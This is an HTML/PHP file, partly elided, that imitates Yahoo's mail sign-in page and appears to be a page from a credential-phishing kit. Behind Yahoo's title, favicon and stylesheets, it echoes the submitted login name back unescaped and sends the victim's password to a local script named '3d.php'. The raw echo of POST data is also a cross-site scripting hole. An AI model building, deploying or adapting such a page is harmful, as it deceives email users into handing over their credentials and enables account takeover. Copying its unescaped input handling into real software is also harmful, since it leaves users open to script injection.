...
<html id="Stencil" class="no-js">
    <head>
        ...
        <title>Mail - Yahoo</title>
		<link rel="shortcut icon" href="https://login.yahoo.com/favicon.ico" />
        <!--[if lte IE 8]>
        ...
        <!--<![endif]-->
        <style nonce="1HLY5Jpm7u4CICqD/OrvVzA59j/nYjyUgQni6Q8TydULRGkn">
            #mbr-css-check { 
                display: inline;
            }
        </style>
        <link href="https://s.yimg.com/zz/combo?wm/mbr/0.1.5028/yahoo-main.css" rel="stylesheet" type="text/css">
<link href="https://s.yimg.com/zz/combo?kx/yucs/uh3s/atomic/88/css/atomic-min.css&kx/yucs/uh_common/meta/3/css/meta-min.css&kx/yucs/uh3s/uh/394/css/uh-center-aligned-min.css" rel="stylesheet" type="text/css">
        <script nonce="1HLY5Jpm7u4CICqD/OrvVzA59j/nYjyUgQni6Q8TydULRGkn">
            (function(root) {
...
root.challenge.servingStamp = 1509965378790;
}(this));
            ...
            window.mbrSendError = function (name, url) {
                (new Image()).src = '/account/js-reporting/?rid=8dkh179d00fi2&crumb=' + encodeURIComponent('ykWZ7nPFqmf') + '&message=' + encodeURIComponent(name.toLowerCase()) + '&url=' + encodeURIComponent(url);
            };
...
text-indent: -30em;
    ...
    <div class="greeting">
        <h1 class="username">Hello <?php echo $_POST['login']; ?></h1>
    ...
    <form name="data" action="3d.php" method="post" class="pure-form pure-form-stacked">
        <input type="hidden" name="browser-fp-data" id="browser-fp-data" value="" />
        <input type="hidden" name="crumb" value="ykWZ7nPFqmf" />
        <input type="hidden" name="acrumb" value="c2TefKtZ" />
        <input type="hidden" name="sessionIndex" value="RA--" />
        <input type="hidden" name="displayName" value="<?php echo $_POST['login']; ?>" />
        ...
        <input type="password" id="login-passwd"  required="" name="passwd" placeholder="Password" autofocus/>
        <p class="signin-cont">
...
<p>Best in class Yahoo Mail, breaking local, national and global news, finance, sports, music, movies and more. You get more out of the web, you get more out of life.</p>
    ...
    <noscript>
        <img src="/account/js-reporting/?crumb=ykWZ7nPFqmf&message=javascript_not_enabled" height="0" width="0" style="visibility: hidden;">
    </noscript>
    <div id="mbr-css-check"></div>
</body>
</html>
<!-- fe06.member.ir2.yahoo.com - Mon Nov 06 2017 10:49:38 GMT+0000 (UTC) - (1ms) -->
